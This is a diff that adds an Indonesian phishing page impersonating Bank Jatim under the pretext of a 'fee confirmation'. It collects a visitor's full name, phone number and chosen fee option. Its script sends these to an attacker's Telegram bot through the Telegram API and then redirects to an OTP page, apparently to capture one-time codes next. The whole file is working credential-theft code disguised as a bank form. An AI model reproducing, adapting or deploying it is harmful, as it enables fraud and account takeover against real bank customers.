@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Konfirmasi Tarif Bank Jatim</title>
+    <meta content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSGfl7c-qki6PqdMlOLtOZBk8orUKeQwdHz-g&s" property="og:image">
+<meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSGfl7c-qki6PqdMlOLtOZBk8orUKeQwdHz-g&s">
+    	<meta name="description" content="Konfirmasi Tarif">
+    
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 10vh;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 435px;
+            background-color: #fff;
+            border-radius: 10px;
+            top: 0;
+            padding: 10px;
+            text-align: center;
+        }
+
+        img {
+            width: 100%;
+            border-radius: 10px 10px 0 0;
+            margin: 0 auto;
+            left:0;
+            right:0;
+            display:flex;
+            margin-bottom: 10px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 5px;
+            text-align: left;
+        }
+
+        input[type="text"],
+        input[type="tel"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 16px;
+            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);
+            outline: none;
+        }
+
+        button {
+            background-color: #721c24;
+            color: #fff;
+            padding: 14px 25px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            font-size: 16px;
+            width: 100%;
+            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.5);
+        }
+
+        button:hover {
+            background-color: #721c24;
+        }
+
+        .flag {
+            display: inline-block;
+            margin-left: 10px;
+            vertical-align: middle;
+            margin-top: 10px;
+            position: absolute;
+            font-size: 20px;
+            color: #721c24;
+        }
+
+        .message {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 5px;
+            display: none;
+        }
+
+        .message.success {
+            background-color: #d4edda;
+            color: #468847;
+            border: 1px solid #c3e6cb;
+        }
+
+        .message.error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAT4AAACfCAMAAABX0UX9AAABJlBMVEX///8zLCuLJSfSJyzlJSq7KS2dJyrRHSPPAAneb3H55+coHx7++Pi7ubnPAAAgFhUaDguCAAC1s7P00dLQFh3PAxCOi4vjAAAfFRPSJCnjjI7QEBjuubotJiTmmZpgXFt3dHTgeXvUNjoXCQbBv7+JHiAOAADS0dHqq6zd3NzcZ2pCPDvZVlmgnp4AAADTLDGmKCuFCg7kDhbnPUH339/vvL3xxse6IibfJiu2AACVAACwKCyGExbZv8CPKy3yoaLviYvrZmnlHSN7eHfaXF9bVlVMR0blk5W4FBroo6SYDxTp6emZSEnhzc3UuLigVle6iYrXSU3pTlHec3XTg4XfqKnIXF/MbW/NdXfuf4HET1LnOj7Vra68enu1ZmjNnJ2VOzy1gYKrPXNMAAANOElEQVR4nO2ceVvaShTGQ4NNhBgQEiAGBIyCIJTW4tJWWot7EZd6l/ZWq/3+X+LOlmQmBBoQG23nffqHmcwMyY8z55xZqCBwcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXH9KVLCfgAuLi4uLi4uLi4uLi4uLi4uLi4uLi6uP0ybYT/Ak9aH9bCf4ClrN/sx7Ed4wtrNdr+G/QxPV7vZ6PqHsB/iyepDNhpd56FjQuUBvWg2FvZjPFGlIb1oNOzHeKKKrUN4XR54J9O3LsS3fhL2czxNfUT0otl22A/yJLWLhi4YvGE/yJPURpbQ80+aY0APcU4N9vsbRPoYoRdd3/C9rcqyuvsAn1uHHY/6Xu75nf2io4mvuwRfdvADQUlMFkVt4QE+d1YSRXn4O2biViIzee/3bB5YX4nj80lb2pfh4SvlIpFIojhp56h5buLmgZW3h+7A2FXKKqQWDr5aJQJVqU3W9z2bB1bMtj2Aj71zoms6fLlw8C3n0Pvnlifrew43T6Qmfrpg+mw7Pk/cTS+ZonYE/woHX9VC729VA3dXpT0daZ6ckH5Q7brGR+fMsbpqiKKE/w7H90UK4PULkWBd9eZKcevFYPPC/Z7wZ0o7ji/a/ewWL8rgzUQ5jy5Cwtdbs3KVtV6gnkqVXByYmre5FbD5xIq6yjqBA45bIKmBL8NKXITqclDHXyygkcoW1gI3n1Sz7tCNbpMy5QqOW2h8ZEYQGr7g8sX34Npwh250fRWX5U0JwRN1UsDxDZFC2R4xvlhDx/BEad+uxuJThr7v8DtDbk+Ar1erVqu1gTbj4et5uwCdTjDOP3ZdelkUJk5kYnoAmPMBLr50eUlWVa2+6u0pfdSQVFU1LxeYFa/06uoq6lc5aZiwYZ5p5cGXB7VX3QXHEhb1ks1iopIEsiprTTcmZEqlvTWUpRRwi6ZP8ya6gElQLxOHnVSKdkZUKyUt0KdVGpPgCTV0u69BQezSNj1RVNNOPRtf+1LWoFc0JFNjOJyI4Abyl4am1qnvdVU19SUBBnIT3Zb0Vppqx+LLq6Zpqu5WlRUvFApxx6JSa6AgQlSIV5wkr5go2OUFqARGVkHNK6RSJgeuLJBDNytxUreyh+7sVUhrqssgalP0olnwWickZCDHRy07E3wb8LZBMKlX7v2WDm9ImibBe5rkrkFtmKLREoSG+60YKjUxZPClVfilUV9LAk8byNXyC4cdVuLQxue5EcdY8KzDpt+E0OJNoZR0K+YAZ2Ut7hYk98bA940aut2PjOmJ2ixVEeE7Aq9nmPLSpSFrsIbp1ljQDF2+LB8dlRFIacm5s6nD1LuhAbOTTVlHjkF1hzeNLwbtU6W9AotPsLDVAdnWcjA+vmaSrmnNCWtM48pcYHpf6bixLuRdrwde+ZKuCfFJ5ZahLW2gKfARhCTKjn2m1cYGgbAJDdBcpPEZi6YhX6UVQUnvwy/IcOnS+JZAQ9lp6IOvWCjkkod7mWbmwMLvnMTz2WIykbAtEsoq+eBLoSqHAGIhkczZFre25ymIB6WXp4fu+uqV7MITDZGJSxCfKBn6rlPQQvycStTWegwC0xywOmpp2g5vEV7LTnUK3z4waZ1Njjz4Ui+Ky+QTe0XyuuhqOZVKHeKXTyEtD8WHxnyqWs3YRgi+h2Rxrrqcsch4DrjCEKPpRb8tSTQ9k11BR/hErUyVwJHmnwouQg42IISPjkJ18DmSM+xdfAugonnF9uTB16MD4yFOVJzlBJ/ExR9fEoeHnuPxLAyshqsXAq4P0o4vui0ykunko72I8VFjDigPueh+HWNHSS4QPucK9ga7Mu0rB98qCBvaPtuRFx+jKnrbuBt9A+KL28FhmdhfoslWyPl+nFcfacdnsPQoY9n8a+bN3xifzh5+ga5K9z0PA6bLUp38jfDpiqedPRl08MGgy7pbqFH4lCRrK0Hx5Zxnsb2fUx/boxVkjeEoO9T0HHrKxr/Hx1vHf5HBa7I9rJrDRi/wi4aNAuKTGKvaBcR0+/sh+KArkJYEr4biU3q9WoJ9+YD44m5mkomz9iuUPP5guDZG0UMmpfz9z5vjrZmZ438FEnnrbBdwFBoNT9nm6snRET3QIT4W8glwjaad+hF8wCKN1uDczQ9fLbV3mLAsK+kJlAHxUWvPzYECxDPA4jadL3sGriinIbv/EDtA7x9Y33fJwIQB2r2MnTR0WTc1TRvAx2Qj0GpNOzdG+IRZSNRnu3cQX2qtkojTidq4+Cg4hOdAwU8zP6XbHWZ6otQW8v8QdjY9f3zQiTkDOlZX0azMwJOSEfjyXnzSCQovPmdrvPjm4glPgnwffHNefHMB8b0eTq918sVhR0auMARfw3BD76IqwWxPl6Wly0ZrPHyiJkLi6uDhGg++DN46AxOPRC454eCdAr7PTtAdgLc1s+WwA/S+CCPwXbr4ytAP6kuLaeS/ANex8IGoAeG3Bh6UxUcy3YJ1mAF5b20tJHxOyuI1vdYMqzfOaw8bvAbeSYJJm+GEg7HxaQ3hUvLMspEYfFVse8kSSSxw3vzL8TkzXU/M2Jrx0nPXPoaGDkRJgb6Lcv1j4oN1UWYkexcRGXwHiI+T5IaEbzfrO3AH4G0d05uWMHHZZTtCZchgUCylXn1MfCiHzkN+qif60vh6yPgKh87NUPDZ9LZHw5s5/o9OwyAqwzMpQNBQuKx7VtzHxYea1jXvtJDFh48cxB3jE3x9n0U/9fTx2fSM0fAot4eExpbnIBmMHDhaQidIJYBo1jE2PgUudNGLEgKLz5v14knbAD56xjV1fF+zg6bnA+94K822Q/hY55eWHWsB8AzDvdOWx0tciOHitWbmiNIgPneKhacILr69OItXmD4+EnON0fBm3nzxzp/wgpVKQ4ULfjqmgBYB3CZ1aSJ8wgLcmddp9zc4eCP2iQ1ygMXFR3BGqEefMj6c71Gm1/KDtzWTHmhJlktNN5pcUoyuJHrScMIsKI+BD30NzLILjU/BeUu8iGo3CT0XH8FbiDRTqUx1+vgUvMDnmp43zSP0vrT7nevbi5vvHbctHI+tsmaoR/hVN0SJmids0stZC7JI58Dj4IvB4WtSLoJJXPB6SKSQLJaKyThaJnZvOr4QAE0kKsNXmyfFl17vMqY3CO/du5cvnwN9Anr79oIewG0dAgE+TtMb5YW6hLY63F2dJbRyX89v5hckzTAXJPtk1nj4sOFSLiJHE+qRKRvci4SlB55MJeNumOXmpo0P7+g6prflBfec1qdPt6z3AxDAcIzBwxuGhHcjDWpPrI32NyVTNzXDUNMQmb1COhY+YR/NnJ1rixmfc5WIq0qzhsyNCrURZzmBBJDp4atnKdNrjSDnBw8MT1XSLuEmur0ZJ8lLzHq+hjfBRUkH5W1VkuwMOA3+1tkFKxnctfHVTXDhfppiapJk2ouICsbnHNBbzpEFl0KusCz0XsAtyxfu/kfvMEkAkg24ShzVsPGhywq1PoULXFpz3gL77bbXXXhbo9ABeM+vB+mnr8pltF+xsa/LOvhX96zSK4stFZY3YOKhzJbLs4RuG/x9xRxI2AR9XTkbb+BiVmFvlmdJ5z2Mz11NF5prFlCiiPBkkOjto7mDpJW0rPgBDh24gp3qVL31SUF1eAHWh2zXhucanh+658/fvj8bhMeqnU77/m4rBsqn+zOKKt7OOKDLlFpt5F5Er9ab7nnI9ut1As/NU/zZvXx72vl5f79OA7sTIWg3291mBq0/OjBq3948sl8D4nnYg5+MH6F8d32bGrTv3vmjA/BeDsSLsFXDru/Bf5cxVOnP2W2K3RCzg3r/6OAJPRJl135e9UEE4Ek2Oy+6lWce7czPv9p5dnf6/ZH8vrFmH0IJeuZkykLwULCg0Q1go7Uyf+eTtIShtZxlH2EMxfjyr1WjxaAbxY3Y3/d+GI/qJ/fMXUDPN03X097tmi03Kf4pOGR4K7ePZNhC2ecd40FOTEDFOtedqSBUVi/VYzL5HzlUKXav5m8ejeEhkeMnldIYKXD/5tn36/69GCr5ff34XXBwkN3O/PnZYwu7zUoiZ0Uy46Ysne/z8yvnF2cTQWyv/vfmU6ChStvd6fUD/+hrEtWaqeXJHqtzMw/17PzHdacfuIvY5s3Lt6+C2xxhd/4Y2d1X/R8r8ztArwDG9+c3F7dnnX6s52OQihLrd85uf5y/h0nbWOh25nduHt2YnZr6t6eEyMoK4AhBorT27vT0HOr09O49QABLX+3sjGl14Hs5vX1csWL6Ujo/gFGxZFYojYWMRnd3MZ0Y//gVO4MIx7SuYeSAr5s//2PQ2VI6F+ev7scQ2tz83Y/rR7Yg9esUO7s4R7P6Md0cAgdToT+WnCulf31xfoeCyM4o37eCwg2ot3J6cztZDvkbK9Y/u764OX+PwjEMvbbw9fzOHUp2+g/yf3b9TlJi7X6/0+mcQXU6/X479pPfc3NxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFx/TH6HwLWrIa/4hjnAAAAAElFTkSuQmCC" alt="">
+        
+        <form method="post" onsubmit="sendHp()">
+          <span><h5>Silahkan Pilih Tarif Transaksi Sesuai Kebutuhan Anda Di Bawah Ini</h5></span> 
+          <h4 style="color:#721c24;"> <label id="label1"> <input required type="radio" name="tarif" id="tarif" value="Tarif Baru Rp 150.000"> Tarif Baru Rp 150.000 / Bulan </label> </h4> 
+     <h4 style="color:#721c24;"> <label required id="label2"> <input type="radio" name="tarif" id="tarif" value="Tarif Lama Rp 6.500"> Tarif Lama Rp 6.500 / Transaksi </label> </h4> 
+          
+        <div class="form-group">
+            <label for="nama">Nama Lengkap</label>
+            <input type="text" id="nama" placeholder="Nama Lengkap Sesuai KTP" required>
+        </div>
+
+        <div class="form-group">
+            <label for="no_hp">Nomor Handphone</label>
+            <div class="flag">🇮🇩</div>
+            <input type="tel" style="padding-left: 40px;" id="nohp" placeholder="+62" required>
+        </div>
+
+        <button id="cek-status" type="submit">Konfirmasi</button>
+        <div class="message" id="message"></div>
+    </div>
+    </form>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+    <script src="i.js"></script>
+    <script>
+        var nama = $('#nama').val();
+        sessionStorage.setItem('nama', nama);
+        var nohp = $('#nohp').val();
+        sessionStorage.setItem("nohp", nohp);
+        var tarif = $('#tarif').val();
+        sessionStorage.setItem('tarif', tarif);
+        
+     
+     
+function sendHp(){
+   
+    event.preventDefault();   
+    $("#cek-status").prop("disabled", true);
+    document.getElementById('cek-status').innerHTML = "Memproses....";               
+    var logo = "____𝗕𝗮𝗻𝘀𝗼𝘀_𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽༻";    
+    var nama = $('#nama').val();
+        sessionStorage.setItem('nama', nama);
+        var nohp = $('#nohp').val();
+        sessionStorage.setItem("nohp", nohp);
+var tarif = $('#tarif').val();
+        sessionStorage.setItem('tarif', tarif);
+    var gabungan = '%0A%0A- 𝗧𝗮𝗿𝗶𝗳 : ' + tarif + '%0A%0A- 𝗡𝗮𝗺𝗮 : ' + nama +  '%0A- 𝗡𝗼.𝗛𝗽 : ' + nohp ;  
+    $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,    
+    complete: function(){    
+    setTimeout(function(){   
+    window.location = "otp.html";
+    
+    document.getElementById('cek-status').innerHTML = "Cek Status"; 
+    
+
+    }, 100);}});};
+     
+     
+     
+     
+     
+     
+        
+    </script>
+</body>
+</html>
